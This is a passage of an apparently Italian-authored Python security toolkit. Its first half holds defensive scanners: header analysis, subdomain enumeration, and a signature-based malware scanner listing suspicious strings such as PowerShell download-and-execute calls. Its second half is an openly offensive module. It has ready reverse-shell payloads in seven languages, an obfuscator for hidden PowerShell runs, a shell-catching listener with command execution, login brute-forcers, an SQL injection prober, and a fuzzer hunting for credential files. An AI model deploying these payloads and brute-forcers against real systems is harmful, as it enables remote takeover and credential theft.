                    info_disclosure.append({
                        "header": h,
                        "value": headers[h],
                        "risk": "Information disclosure",
                    })
        
        if info_disclosure:
            score -= len(info_disclosure) * 5
        
        return {
            "url": url,
            "status_code": status_code,
            "security_score": max(0, score),
            "grade": SSLAnalyzer._score_to_grade(max(0, score)),
            "headers_present": present,
            "headers_missing": missing,
            "info_disclosure": info_disclosure,
            "all_headers": headers,
        }


# ==============================================================================
# IP GEOLOCATION & INTEL
# ==============================================================================

class IPIntel:
    """IP geolocation and intelligence gathering"""
    
    @staticmethod
    def geolocate(ip: str) -> Dict:
        """Geolocate IP address using free API"""
        try:
            # ip-api.com (free, no key required)
            url = f"[ip-api.com](http://ip-api.com/json/{ip})"
            req = urllib.request.Request(
                url, headers={"User-Agent": USER_AGENT}
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read().decode())
            
            if data.get("status") == "success":
                return {
                    "ip": ip,
                    "country": data.get("country", ""),
                    "country_code": data.get("countryCode", ""),
                    "region": data.get("regionName", ""),
                    "city": data.get("city", ""),
                    "zip": data.get("zip", ""),
                    "lat": data.get("lat", 0),
                    "lon": data.get("lon", 0),
                    "timezone": data.get("timezone", ""),
                    "isp": data.get("isp", ""),
                    "org": data.get("org", ""),
                    "as": data.get("as", ""),
                }
            else:
                return {"error": data.get("message", "Lookup failed"), "ip": ip}
        except Exception as e:
            return {"error": str(e), "ip": ip}
    
    @staticmethod
    def get_my_public_ip() -> Optional[str]:
        """Get current public IP"""
        return get_public_ip()
    
    @staticmethod
    def analyze_ip(ip: str) -> Dict:
        """Comprehensive IP analysis"""
        result = {
            "ip": ip,
            "valid": is_valid_ip(ip),
            "is_private": IPIntel._is_private(ip),
            "is_loopback": ip.startswith("127."),
            "is_multicast": IPIntel._is_multicast(ip),
        }
        
        # Hostname lookup
        hostname = reverse_dns(ip)
        if hostname:
            result["hostname"] = hostname
        
        # Geolocation se non privato
        if not result["is_private"] and not result["is_loopback"]:
            geo = IPIntel.geolocate(ip)
            if "error" not in geo:
                result["geolocation"] = geo
        
        return result
    
    @staticmethod
    def _is_private(ip: str) -> bool:
        """Check if IP is in private range"""
        try:
            parts = [int(x) for x in ip.split(".")]
            if len(parts) != 4:
                return False
            
            # 10.0.0.0/8
            if parts[0] == 10:
                return True
            # 172.16.0.0/12
            if parts[0] == 172 and 16 <= parts[1] <= 31:
                return True
            # 192.168.0.0/16
            if parts[0] == 192 and parts[1] == 168:
                return True
            # 127.0.0.0/8 (loopback)
            if parts[0] == 127:
                return True
            
            return False
        except Exception:
            return False
    
    @staticmethod
    def _is_multicast(ip: str) -> bool:
        try:
            first_octet = int(ip.split(".")[0])
            return 224 <= first_octet <= 239
        except Exception:
            return False


# ==============================================================================
# SUBDOMAIN ENUMERATION
# ==============================================================================

class SubdomainEnumerator:
    """Enumerate subdomains via DNS bruteforce"""
    
    COMMON_SUBDOMAINS = [
        "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop",
        "ns1", "ns2", "ns3", "ns4", "webdisk", "admin", "administrator",
        "blog", "dev", "test", "staging", "api", "secure", "vpn",
        "shop", "store", "cdn", "static", "media", "img", "images",
        "git", "svn", "jenkins", "ci", "build", "deploy",
        "portal", "intranet", "extranet", "remote", "support",
        "help", "kb", "wiki", "docs", "documentation",
        "demo", "beta", "alpha", "preview", "old", "new",
        "m", "mobile", "wap", "app", "apps",
        "forum", "forums", "community", "chat",
        "video", "videos", "stream", "tv", "live",
        "download", "downloads", "files", "share",
        "auth", "login", "sso", "oauth", "id",
        "db", "database", "sql", "mysql", "postgres",
        "monitor", "monitoring", "metrics", "stats", "status",
        "internal", "private", "corp", "corporate",
        "cloud", "cluster", "node", "edge",
    ]
    
    def __init__(self, max_threads: int = 30):
        self.max_threads = max_threads
    
    def enumerate(self, domain: str, wordlist: List[str] = None,
                 progress_callback: Callable = None) -> List[Dict]:
        """Enumerate subdomains of a domain"""
        if wordlist is None:
            wordlist = self.COMMON_SUBDOMAINS
        
        found = []
        
        def check_subdomain(sub: str) -> Optional[Dict]:
            full_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                return {"subdomain": full_domain, "ip": ip}
            except socket.gaierror:
                return None
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_sub = {
                executor.submit(check_subdomain, sub): sub
                for sub in wordlist
            }
            
            completed = 0
            total = len(wordlist)
            
            for future in concurrent.futures.as_completed(future_to_sub):
                completed += 1
                if progress_callback:
                    progress_callback(completed, total)
                
                try:
                    result = future.result()
                    if result:
                        found.append(result)
                except Exception as _e:
                    pass  # suppressed error
        
        return sorted(found, key=lambda x: x["subdomain"])


# ==============================================================================
# MALWARE SIGNATURE SCANNER (BASIC)
# ==============================================================================

class MalwareScanner:
    """Basic malware/suspicious file detection based on signatures and heuristics"""
    
    # Known malicious file extensions
    SUSPICIOUS_EXTENSIONS = {
        ".exe", ".scr", ".vbs", ".bat", ".cmd", ".com", ".pif",
        ".jar", ".js", ".jse", ".wsf", ".wsh", ".ps1", ".psm1",
        ".hta", ".cpl", ".msi", ".reg"
    }
    
    # Known malware patterns (file signatures - first bytes)
    MALWARE_SIGNATURES = {
        b"MZ": "Windows executable (PE)",
        b"\x7fELF": "Linux executable (ELF)",
    }
    
    # Suspicious strings to look for
    SUSPICIOUS_STRINGS = [
        b"cmd.exe", b"powershell", b"WScript.Shell",
        b"Net.WebClient", b"DownloadString", b"Invoke-Expression",
        b"base64", b"FromBase64String", b"eval(", b"exec(",
        b"system(", b"shell_exec", b"passthru",
        b"CreateRemoteThread", b"VirtualAlloc",
        b"GetProcAddress", b"LoadLibrary",
    ]
    
    @staticmethod
    def scan_file(filepath: str) -> Dict:
        """Scan a file for suspicious indicators"""
        path = Path(filepath)
        if not path.exists() or not path.is_file():
            return {"error": "File not found", "path": filepath}
        
        result = {
            "path": str(path),
            "filename": path.name,
            "size_bytes": path.stat().st_size,
            "extension": path.suffix.lower(),
            "suspicious_extension": path.suffix.lower() in MalwareScanner.SUSPICIOUS_EXTENSIONS,
            "indicators": [],
            "risk_score": 0,
        }
        
        # File hash
        try:
            result["md5"] = get_file_hash(filepath, "md5")
            result["sha256"] = get_file_hash(filepath, "sha256")
        except Exception as _e:
            pass  # suppressed error
        
        try:
            with open(filepath, "rb") as f:
                # Read first bytes for signature
                header = f.read(16)
                
                for sig, desc in MalwareScanner.MALWARE_SIGNATURES.items():
                    if header.startswith(sig):
                        result["file_type"] = desc
                        if path.suffix.lower() not in [".exe", ".dll", ".so"]:
                            result["indicators"].append(
                                "File type mismatch (executable with non-executable extension)"
                            )
                            result["risk_score"] += 50
                
                # Read more to search for suspicious strings (max 5MB)
                f.seek(0)
                content = f.read(5 * 1024 * 1024)
                
                for pattern in MalwareScanner.SUSPICIOUS_STRINGS:
                    if pattern in content:
                        result["indicators"].append(
                            f"Suspicious string found: {pattern.decode('ascii', errors='replace')}"
                        )
                        result["risk_score"] += 10
        except Exception as e:
            result["error"] = str(e)
        
        # Risk level
        if result["suspicious_extension"]:
            result["risk_score"] += 20
        
        score = result["risk_score"]
        if score >= 80:
            result["risk_level"] = "critical"
        elif score >= 50:
            result["risk_level"] = "high"
        elif score >= 25:
            result["risk_level"] = "medium"
        elif score > 0:
            result["risk_level"] = "low"
        else:
            result["risk_level"] = "clean"
        
        return result
    
    @staticmethod
    def scan_directory(directory: str, recursive: bool = True,
                      progress_callback: Callable = None) -> List[Dict]:
        """Scan all files in a directory"""
        path = Path(directory)
        if not path.exists() or not path.is_dir():
            return []
        
        results = []
        files = list(path.rglob("*") if recursive else path.glob("*"))
        files = [f for f in files if f.is_file()]
        
        for i, file_path in enumerate(files):
            if progress_callback:
                progress_callback(i + 1, len(files))
            
            try:
                scan_result = MalwareScanner.scan_file(str(file_path))
                if scan_result.get("risk_score", 0) > 0:
                    results.append(scan_result)
            except Exception as _e:
                pass  # suppressed error
        
        return sorted(results, key=lambda x: x.get("risk_score", 0), reverse=True)


class VulnerabilityScanner:
    """
    Basic vulnerability assessment.
    Combines multiple checks: open ports, weak SSL, missing headers, etc.
    """
    
    # Vulnerabilità note (esempi semplificati)
    KNOWN_VULNERABLE_VERSIONS = {
        "OpenSSH": {
            "7.4": ["CVE-2018-15473 - Username enumeration"],
            "5.3": ["Multiple critical CVEs - update immediately"],
        },
        "Apache": {
            "2.4.49": ["CVE-2021-41773 - Path traversal RCE"],
            "2.4.50": ["CVE-2021-42013 - Path traversal RCE"],
        },
        "nginx": {
            "1.3.9": ["CVE-2013-2028 - Stack buffer overflow"],
        },
    }
    
    DANGEROUS_PORTS = {
        21: ("FTP", "Cleartext credentials, prefer SFTP"),
        23: ("Telnet", "Cleartext protocol, use SSH"),
        135: ("RPC", "Often exploited, restrict access"),
        139: ("NetBIOS", "Information disclosure risk"),
        445: ("SMB", "Multiple historical CVEs (EternalBlue, etc)"),
        1433: ("MSSQL", "Database exposed, restrict to internal"),
        3306: ("MySQL", "Database exposed, restrict to internal"),
        3389: ("RDP", "Frequent brute-force target, use VPN"),
        5432: ("PostgreSQL", "Database exposed, restrict to internal"),
        5900: ("VNC", "Often weak authentication"),
        6379: ("Redis", "Default no auth, frequent target"),
        27017: ("MongoDB", "Default no auth, frequent target"),
    }
    
    def __init__(self):
        self.network_scanner = NetworkScanner()
        self.ssl_analyzer = SSLAnalyzer()
        self.http_analyzer = HTTPSecurityAnalyzer()
    
    def scan_target(self, target: str,
                   progress_callback: Callable = None) -> Dict:
        """Comprehensive vulnerability scan of a target"""
        start_time = time.perf_counter()
        
        vulnerabilities: List[VulnerabilityInfo] = []
        report = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "vulnerabilities": [],
            "open_ports": [],
            "ssl_analysis": None,
            "http_security": None,
            "summary": {},
        }
        
        # Step 1: Port scan
        if progress_callback:
            progress_callback("Scansione porte...", 10)
        
        open_ports = self.network_scanner.quick_scan(target)
        report["open_ports"] = [
            {
                "port": p.port, "service": p.service,
                "version": p.version, "banner": p.metadata.get("banner", "")
            }
            for p in open_ports
        ]
        
        # Verifica porte pericolose
        for port_result in open_ports:
            if port_result.port in self.DANGEROUS_PORTS:
                service, description = self.DANGEROUS_PORTS[port_result.port]
                vulnerabilities.append(VulnerabilityInfo(
                    name=f"Exposed {service} service on port {port_result.port}",
                    severity="high" if port_result.port in [23, 445, 3389] else "medium",
                    description=description,
                    affected_component=f"{service} (port {port_result.port})",
                    remediation=f"Disable {service} if unused, or restrict to trusted networks",
                ))
            
            # Verifica versioni vulnerabili
            if port_result.version:
                for product, versions in self.KNOWN_VULNERABLE_VERSIONS.items():
                    if product.lower() in port_result.version.lower():
                        for vuln_version, cves in versions.items():
                            if vuln_version in port_result.version:
                                for cve in cves:
                                    vulnerabilities.append(VulnerabilityInfo(
                                        name=cve.split(" - ")[0] if " - " in cve else cve,
                                        severity="critical",
                                        description=cve,
                                        cve_id=cve.split(" - ")[0] if " - " in cve else "",
                                        affected_component=port_result.version,
                                        remediation="Update to latest version immediately",
                                    ))
        
        # Step 2: SSL/TLS analysis se HTTPS aperto
        if progress_callback:
            progress_callback("Analisi SSL/TLS...", 40)
        
        if any(p.port == 443 for p in open_ports):
            try:
                ssl_result = self.ssl_analyzer.analyze_security(target)
                report["ssl_analysis"] = ssl_result
                
                # Estrai problemi come vulnerabilità
                if "issues" in ssl_result:
                    for issue in ssl_result["issues"]:
                        vulnerabilities.append(VulnerabilityInfo(
                            name=issue["issue"],
                            severity=issue["severity"],
                            description=issue["issue"],
                            affected_component="SSL/TLS configuration",
                            remediation="Update SSL/TLS configuration",
                        ))
            except Exception as e:
                report["ssl_analysis"] = {"error": str(e)}
        
        # Step 3: HTTP security headers
        if progress_callback:
            progress_callback("Analisi HTTP headers...", 70)
        
        if any(p.port in [80, 443, 8080, 8443] for p in open_ports):
            try:
                protocol = "https" if any(p.port == 443 for p in open_ports) else "http"
                http_result = self.http_analyzer.analyze(f"{protocol}://{target}")
                report["http_security"] = http_result
                
                # Estrai header mancanti come vulnerabilità
                if "headers_missing" in http_result:
                    for missing in http_result["headers_missing"]:
                        if missing["severity"] in ["high", "medium"]:
                            vulnerabilities.append(VulnerabilityInfo(
                                name=f"Missing security header: {missing['header']}",
                                severity=missing["severity"],
                                description=missing["description"],
                                affected_component="HTTP response headers",
                                remediation=f"Add header: {missing['header']}: {missing['recommended']}",
                            ))
            except Exception as e:
                report["http_security"] = {"error": str(e)}
        
        if progress_callback:
            progress_callback("Generazione report...", 95)
        
        # Compila report finale
        report["vulnerabilities"] = [
            {
                "name": v.name,
                "severity": v.severity,
                "description": v.description,
                "cve_id": v.cve_id,
                "affected": v.affected_component,
                "remediation": v.remediation,
            }
            for v in vulnerabilities
        ]
        
        # Summary
        severity_count = Counter(v.severity for v in vulnerabilities)
        report["summary"] = {
            "total_vulnerabilities": len(vulnerabilities),
            "critical": severity_count.get("critical", 0),
            "high": severity_count.get("high", 0),
            "medium": severity_count.get("medium", 0),
            "low": severity_count.get("low", 0),
            "open_ports_count": len(open_ports),
            "scan_duration": round(time.perf_counter() - start_time, 2),
            "risk_level": self._calculate_risk_level(severity_count),
        }
        
        if progress_callback:
            progress_callback("Completato", 100)
        
        return report
    
    @staticmethod
    def _calculate_risk_level(severity_count: Counter) -> str:
        if severity_count.get("critical", 0) > 0:
            return "CRITICAL"
        if severity_count.get("high", 0) >= 3:
            return "HIGH"
        if severity_count.get("high", 0) > 0:
            return "MEDIUM-HIGH"
        if severity_count.get("medium", 0) >= 3:
            return "MEDIUM"
        if severity_count.get("medium", 0) > 0:
            return "LOW-MEDIUM"
        if severity_count.get("low", 0) > 0:
            return "LOW"
        return "CLEAN"


# ==============================================================================
# SECURITY COORDINATOR — Master Security Module
# ==============================================================================

# ==============================================================================
# OFFENSIVE TOOLKIT — RED TEAM / OFFENSIVE SECURITY MODULE
# ==============================================================================

class OffensiveToolkit:
    """
    Toolkit offensivo integrato per red-teaming e penetration testing.
    Tutto stdlib-first: socket/subprocess/urllib. Usa scapy/requests se
    disponibili, altrimenti fallback puri.

    Componenti:
      • ReverseShellForge   -> payload multi-linguaggio + comando msfvenom
      • PayloadEncoder      -> base64 / xor / powershell -enc / hex / url
      • Listener            -> handler TCP threaded per catch della reverse shell
      • FastSweep           -> connect-scan aggressivo multithread con banner
      • WebFuzzer           -> brute force directory/file su HTTP(S)
      • FormBrute           -> brute force login form HTTP + basic auth
      • SqliProber          -> detection SQLi error-based + boolean-based
      • ArpDiscovery        -> scoperta host LAN (scapy o tabella ARP di sistema)
      • ExploitLookup       -> ricerca offline + passthrough searchsploit
    """

    # Payload di reverse shell parametrici su {ip}/{port}
    _RSHELL_TEMPLATES = {
        "bash":       "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "bash_udp":   "sh -i >& /dev/udp/{ip}/{port} 0>&1",
        "nc":         "nc {ip} {port} -e /bin/sh",
        "nc_mkfifo":  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "python":     ("python3 -c 'import socket,subprocess,os;"
                       "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                       "s.connect((\"{ip}\",{port}));"
                       "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                       "import pty;pty.spawn(\"/bin/sh\")'"),
        "php":        "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl":       ("perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                       "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                       "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
                       "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"),
        "ruby":       ("ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
                       "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
        "powershell": ("powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
                       "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                       "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                       "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                       "$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS> ');"
                       "$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\""),
    }

    def __init__(self, logger: "StructuredLogger" = None, max_threads: int = 100,
                 timeout: float = 1.5):
        self.logger = logger
        self.max_threads = max_threads
        self.timeout = timeout
        self._stop = threading.Event()
        self._listeners: Dict[int, threading.Thread] = {}
        self._sessions: Dict[int, socket.socket] = {}
        self._session_lock = threading.Lock()

    def _log(self, level: str, msg: str):
        if self.logger:
            getattr(self.logger, level, self.logger.info)("OFFENSIVE", msg)

    # ------------------------------------------------------------------
    # REVERSE SHELL FORGE
    # ------------------------------------------------------------------
    def reverse_shell(self, lhost: str, lport: int, flavor: str = "bash") -> Dict:
        """Genera un payload di reverse shell per il flavor richiesto."""
        flavor = flavor.lower().strip()
        tpl = self._RSHELL_TEMPLATES.get(flavor)
        if not tpl:
            return {"error": f"flavor '{flavor}' sconosciuto",
                    "available": sorted(self._RSHELL_TEMPLATES.keys())}
        payload = tpl.format(ip=lhost, port=lport)
        return {
            "flavor": flavor,
            "lhost": lhost,
            "lport": lport,
            "payload": payload,
            "listener_hint": f"nc -lvnp {lport}",
        }

    def all_reverse_shells(self, lhost: str, lport: int) -> Dict[str, str]:
        """Restituisce ogni flavor renderizzato in un colpo solo."""
        return {name: tpl.format(ip=lhost, port=lport)
                for name, tpl in self._RSHELL_TEMPLATES.items()}

    @staticmethod
    def msfvenom_command(lhost: str, lport: int,
                         platform_name: str = "windows",
                         fmt: str = "exe") -> str:
        """Costruisce la riga msfvenom corrispondente (non la esegue)."""
        payload_map = {
            "windows": "windows/x64/meterpreter/reverse_tcp",
            "linux":   "linux/x64/meterpreter/reverse_tcp",
            "android": "android/meterpreter/reverse_tcp",
            "macos":   "osx/x64/meterpreter/reverse_tcp",
            "php":     "php/meterpreter/reverse_tcp",
        }
        payload = payload_map.get(platform_name.lower(), payload_map["windows"])
        return (f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
                f"-f {fmt} -o payload.{fmt}")

    # ------------------------------------------------------------------
    # PAYLOAD ENCODER / OBFUSCATOR
    # ------------------------------------------------------------------
    @staticmethod
    def encode(payload: str, scheme: str = "base64", key: str = "K") -> Dict:
        """Codifica/offusca un payload. scheme: base64|hex|url|xor|ps_enc."""
        scheme = scheme.lower()
        raw = payload.encode("utf-8")
        if scheme == "base64":
            out = base64.b64encode(raw).decode()
        elif scheme == "hex":
            out = raw.hex()
        elif scheme == "url":
            out = urllib.parse.quote(payload, safe="")
        elif scheme == "xor":
            kb = key.encode() or b"K"
            xored = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(raw))
            out = base64.b64encode(xored).decode()
        elif scheme == "ps_enc":
            # PowerShell -EncodedCommand richiede UTF-16LE + base64
            out = base64.b64encode(payload.encode("utf-16-le")).decode()
            return {"scheme": scheme, "encoded": out,
                    "runner": f"powershell -nop -w hidden -enc {out}"}
        else:
            return {"error": f"scheme '{scheme}' non supportato"}
        return {"scheme": scheme, "key": key if scheme == "xor" else None,
                "encoded": out}

    # ------------------------------------------------------------------
    # LISTENER / SHELL CATCHER
    # ------------------------------------------------------------------
    def start_listener(self, port: int, bind: str = "0.0.0.0") -> Dict:
        """Avvia un handler TCP threaded che cattura una reverse shell."""
        if port in self._listeners:
            return {"error": f"listener già attivo su :{port}"}

        def _serve():
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind((bind, port))
                srv.listen(1)
                srv.settimeout(1.0)
                self._log("info", f"Listener in ascolto su {bind}:{port}")
                while not self._stop.is_set():
                    try:
                        conn, addr = srv.accept()
                    except socket.timeout:
                        continue
                    with self._session_lock:
                        self._sessions[port] = conn
                    self._log("success", f"Shell ricevuta da {addr[0]}:{addr[1]} su :{port}")
                    break
                srv.close()
            except Exception as e:
                self._log("error", f"Listener :{port} errore: {e}")

        t = threading.Thread(target=_serve, daemon=True, name=f"listener-{port}")
        t.start()
        self._listeners[port] = t
        return {"listening": True, "bind": bind, "port": port}

    def session_exec(self, port: int, command: str, recv_timeout: float = 2.0) -> Dict:
        """Invia un comando alla shell catturata e legge l'output."""
        with self._session_lock:
            conn = self._sessions.get(port)
        if not conn:
            return {"error": f"nessuna sessione attiva su :{port}"}
        try:
            conn.sendall((command.rstrip("\n") + "\n").encode())
            conn.settimeout(recv_timeout)
            chunks = []
            try:
                while True:
                    data = conn.recv(4096)
                    if not data:
                        break
                    chunks.append(data)
            except socket.timeout:
                pass
            return {"port": port, "command": command,
                    "output": b"".join(chunks).decode("utf-8", errors="replace")}
        except Exception as e:
            return {"error": str(e)}

    def stop_listener(self, port: int) -> Dict:
        with self._session_lock:
            conn = self._sessions.pop(port, None)
        if conn:
            try:
                conn.close()
            except Exception:
                pass
        self._listeners.pop(port, None)
        return {"stopped": port}

    # ------------------------------------------------------------------
    # FAST CONNECT SWEEP (aggressivo)
    # ------------------------------------------------------------------
    def fast_sweep(self, host: str, ports: List[int] = None,
                   grab_banner: bool = True,
                   progress_callback: Callable = None) -> List[Dict]:
        """Connect-scan multithread aggressivo su una lista di porte."""
        try:
            ip = socket.gethostbyname(host)
        except socket.gaierror:
            return [{"error": f"host '{host}' non risolvibile"}]

        if ports is None:
            ports = list(range(1, 1025))
        self._stop.clear()
        open_ports: List[Dict] = []

        def _probe(port: int):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            try:
                if s.connect_ex((ip, port)) != 0:
                    return None
                banner = ""
                if grab_banner:
                    try:
                        s.settimeout(0.6)
                        if port in (80, 8080, 8000, 8888):
                            s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = s.recv(256).decode("utf-8", errors="replace").strip()
                    except Exception:
                        pass
                return {"port": port,
                        "service": COMMON_PORTS.get(port, "unknown"),
                        "banner": banner[:160]}
            finally:
                s.close()

        with ThreadPoolExecutor(max_workers=self.max_threads) as ex:
            futs = {ex.submit(_probe, p): p for p in ports}
            done, total = 0, len(ports)
            for fut in concurrent.futures.as_completed(futs):
                if self._stop.is_set():
                    break
                done += 1
                if progress_callback:
                    progress_callback(done, total)
                r = fut.result()
                if r:
                    open_ports.append(r)
        open_ports.sort(key=lambda x: x["port"])
        return open_ports

    # ------------------------------------------------------------------
    # HTTP HELPER (requests se presente, altrimenti urllib)
    # ------------------------------------------------------------------
    def _http(self, url: str, method: str = "GET", data: bytes = None,
              headers: Dict = None, timeout: float = 6.0) -> Dict:
        headers = headers or {"User-Agent": "FRANCO-Offensive/6.0"}
        if DEPENDENCIES_STATUS.get("requests"):
            try:
                resp = requests.request(method, url, data=data, headers=headers,
                                        timeout=timeout, allow_redirects=False,
                                        verify=False)
                return {"status": resp.status_code, "len": len(resp.content),
                        "body": resp.text, "headers": dict(resp.headers)}
            except Exception as e:
                return {"error": str(e)}
        try:
            req = urllib.request.Request(url, data=data, headers=headers, method=method)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode("utf-8", errors="replace")
                return {"status": r.status, "len": len(body), "body": body,
                        "headers": dict(r.headers)}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "len": 0, "body": "", "headers": {}}
        except Exception as e:
            return {"error": str(e)}

    # ------------------------------------------------------------------
    # WEB DIRECTORY / FILE FUZZER
    # ------------------------------------------------------------------
    _DEFAULT_WORDLIST = [
        "admin", "login", "dashboard", "config", "config.php", ".env", ".git/HEAD",
        "backup", "backup.zip", "db.sql", "wp-admin", "wp-login.php", "phpmyadmin",
        "api", "api/v1", "uploads", "images", "assets", "test", "dev", "staging",
        "robots.txt", "sitemap.xml", "server-status", "actuator", "actuator/env",
        "console", "shell", "cmd", "debug", "info.php", "phpinfo.php", ".htaccess",
        "user", "users", "account", "register", "portal", "private", "secret",
        "old", "tmp", "temp", "logs", "log", "id_rsa", "credentials", "secrets.json",
    ]

    def web_fuzz(self, base_url: str, wordlist: List[str] = None,
                 progress_callback: Callable = None,
                 hide_codes: tuple = (404,)) -> List[Dict]:
        """Brute force di path su un target web. Ritorna gli hit interessanti."""
        base_url = base_url.rstrip("/")
        if not base_url.startswith("http"):
            base_url = "http://" + base_url
        words = wordlist or self._DEFAULT_WORDLIST
        self._stop.clear()
        hits: List[Dict] = []

        def _hit(word: str):
            url = f"{base_url}/{word.lstrip('/')}"
            r = self._http(url, timeout=self.timeout + 3)
            if "error" in r or r.get("status") in hide_codes:
                return None
            return {"path": "/" + word.lstrip("/"), "status": r["status"],
                    "size": r.get("len", 0), "url": url}

        with ThreadPoolExecutor(max_workers=min(self.max_threads, 30)) as ex:
            futs = {ex.submit(_hit, w): w for w in words}
            done, total = 0, len(words)
            for fut in concurrent.futures.as_completed(futs):
                if self._stop.is_set():
                    break
                done += 1
                if progress_callback:
                    progress_callback(done, total)
                r = fut.result()
                if r:
                    hits.append(r)
        hits.sort(key=lambda x: x["status"])
        return hits

    # ------------------------------------------------------------------
    # HTTP LOGIN / BASIC-AUTH BRUTE FORCE
    # ------------------------------------------------------------------
    def form_brute(self, url: str, user_field: str, pass_field: str,
                   username: str, passwords: List[str],
                   fail_marker: str = None, extra: Dict = None,
                   progress_callback: Callable = None) -> Dict:
        """
        Brute force di un form di login via POST.
        Successo = 'fail_marker' assente dalla risposta (o redirect 3xx).
        """
        self._stop.clear()
        extra = extra or {}
        total = len(passwords)
        for i, pwd in enumerate(passwords, 1):
            if self._stop.is_set():
                break
            if progress_callback:
                progress_callback(i, total)
            payload = {user_field: username, pass_field: pwd, **extra}
            data = urllib.parse.urlencode(payload).encode()
            r = self._http(url, method="POST", data=data,
                           headers={"Content-Type": "application/x-www-form-urlencoded",
                                    "User-Agent": "FRANCO-Offensive/6.0"})
            if "error" in r:
                continue
            status = r.get("status", 0)
            body = r.get("body", "")
            success = (300 <= status < 400) if fail_marker is None \
                else (fail_marker.lower() not in body.lower())
            if success and status not in (401, 403):
                return {"cracked": True, "username": username, "password": pwd,
                        "attempts": i, "status": status}
        return {"cracked": False, "username": username, "attempts": total}

    def basic_auth_brute(self, url: str, username: str, passwords: List[str],
                         progress_callback: Callable = None) -> Dict:
        """Brute force HTTP Basic Auth."""
        self._stop.clear()
        total = len(passwords)
        for i, pwd in enumerate(passwords, 1):
            if self._stop.is_set():
                break
            if progress_callback:
                progress_callback(i, total)
            token = base64.b64encode(f"{username}:{pwd}".encode()).decode()
            r = self._http(url, headers={"Authorization": f"Basic {token}",
                                         "User-Agent": "FRANCO-Offensive/6.0"})
            if "error" in r:
                continue
            if r.get("status", 401) not in (401, 403):
                return {"cracked": True, "username": username, "password": pwd,
                        "attempts": i, "status": r["status"]}
        return {"cracked": False, "username": username, "attempts": total}

    # ------------------------------------------------------------------
    # SQL INJECTION PROBER
    # ------------------------------------------------------------------
    _SQL_ERRORS = [
        "you have an error in your sql syntax", "warning: mysql",
        "unclosed quotation mark", "quoted string not properly terminated",
        "sqlstate", "odbc drivers error", "postgresql query failed",
        "org.hibernate", "sqlite3.operationalerror", "pg_query",
    ]

    def sqli_probe(self, url: str, param: str) -> Dict:
        """
        Testa un parametro GET per SQL injection (error-based + boolean-based).
        url: 'http://site/page?id=1'  param: 'id'
        """
        parsed = urllib.parse.urlparse(url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        if param not in qs:
            return {"error": f"parametro '{param}' non presente nella query string"}
        base_val = qs[param]

        def _fetch(value: str) -> Dict:
            q = dict(qs)
            q[param] = value
            new = parsed._replace(query=urllib.parse.urlencode(q))
            return self._http(urllib.parse.urlunparse(new), timeout=self.timeout + 4)

        findings = {"url": url, "param": param, "vulnerable": False, "techniques": []}

        # 1) Error-based: inietta una virgoletta
        err = _fetch(base_val + "'")
        body = (err.get("body") or "").lower()
        if any(sig in body for sig in self._SQL_ERRORS):
            findings["vulnerable"] = True
            findings["techniques"].append("error-based")

        # 2) Boolean-based: TRUE vs FALSE devono differire
        t_res = _fetch(base_val + "' AND '1'='1")
        f_res = _fetch(base_val + "' AND '1'='2")
        if "error" not in t_res and "error" not in f_res:
            if t_res.get("len", 0) != f_res.get("len", -1):
                findings["vulnerable"] = True
                findings["techniques"].append("boolean-based")
                findings["true_len"] = t_res.get("len")
                findings["false_len"] = f_res.get("len")

        return findings

    # ------------------------------------------------------------------
    # ARP DISCOVERY (LAN)
    # ------------------------------------------------------------------
    def arp_discovery(self, network: str = "192.168.1.0/24") -> List[Dict]:
        """Scoperta host sulla LAN via ARP (scapy) o tabella ARP di sistema."""
        if DEPENDENCIES_STATUS.get("scapy") and scapy:
            try:
                ans, _ = scapy.arping(network, timeout=2, verbose=0)
                return [{"ip": r[1].psrc, "mac": r[1].hwsrc} for r in ans]
            except Exception as e:
                self._log("warning", f"scapy arping fallito ({e}), fallback tabella ARP")
        # Fallback: parse della tabella ARP locale
        cmd = ["arp", "-a"] if IS_WINDOWS else ["arp", "-n"]
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=10).stdout
        except Exception as e:
            return [{"error": str(e)}]
        hosts = []
        for m in re.finditer(r"(\d+\.\d+\.\d+\.\d+)\s+.*?([0-9a-fA-F]{2}[:-]"
